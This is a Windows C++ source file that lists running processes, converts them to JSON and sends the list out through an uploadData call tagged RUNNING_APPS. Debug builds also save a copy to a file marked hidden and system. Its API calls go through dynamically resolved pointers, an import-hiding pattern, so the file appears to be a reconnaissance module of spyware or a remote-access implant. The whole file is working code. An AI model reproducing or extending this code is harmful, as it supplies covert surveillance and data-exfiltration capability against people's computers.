#include "../api.h"
#include "../public.h"
#include "interface.h"
#include <Windows.h>
#include <lm.h>
#include <Winternl.h>
#include "../network/NetWorkdata.h"
#include <string>
#include <unordered_map>
#include "RunningProcess.h"
#include <json/json.h>
#include "../log.h"
#include "../StrHelper.h"

using namespace std;


unordered_map <string, PROCESSENTRY32W> gRunningMap;


int GetRunningProcessInfo()
{
	int iRet = 0;

	PROCESSENTRY32 pe32 = { 0 };
	pe32.dwSize = sizeof(pe32);
	HANDLE hProcessSnap = lpCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		writeLog("GetRunningProcessInfo lpCreateToolhelp32Snapshot error\r\n");
		return FALSE;
	}

	BOOL bNext = lpProcess32First(hProcessSnap, &pe32);
	while (bNext)
	{
		char szexefn[MAX_PATH] = { 0 };
		int ret = WStringToMString(pe32.szExeFile, lplstrlenW(pe32.szExeFile), szexefn, MAX_PATH);

		unordered_map <string, PROCESSENTRY32W>::iterator it = gRunningMap.find(szexefn);
		if (it == gRunningMap.end())
		{
			gRunningMap.insert(pair<string, PROCESSENTRY32W>(szexefn, pe32));
		}
		bNext = lpProcess32Next(hProcessSnap, &pe32);
	}
	lpCloseHandle(hProcessSnap);

	Json::Value proc;
	Json::FastWriter fastwriter;
	Json::Value lists;

	unordered_map <string, PROCESSENTRY32W>::iterator it;
	for (it = gRunningMap.begin(); it != gRunningMap.end(); it++)
	{
		proc["process"] = it->first;
		char szid[16] = { 0 };
		lpwsprintfA(szid, "%u", it->second.th32ProcessID);
		proc["ID"] = szid;
		lists.append(proc);
	}
	string infojson = lists.toStyledString();
	//string infojson = fastwriter.write(lists);
	iRet = uploadData((char*)infojson.c_str(), infojson.length(), RUNNING_APPS, 0);

#ifdef _DEBUG
	char strFilePath[MAX_PATH] = { 0 };
	iRet = makeFullFileName(strFilePath, RUNNINGAPPS_FILENAME);
	HANDLE hFile = lpCreateFileA(strFilePath, GENERIC_WRITE | GENERIC_READ, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		writeLog("GetMachineInfo lpCreateFileA error\r\n");
		return FALSE;
	}

	DWORD dwCnt = 0;
	iRet = lpWriteFile(hFile, (char*)infojson.c_str(), infojson.length(), &dwCnt, 0);
	lpCloseHandle(hFile);
#endif

	return TRUE;
}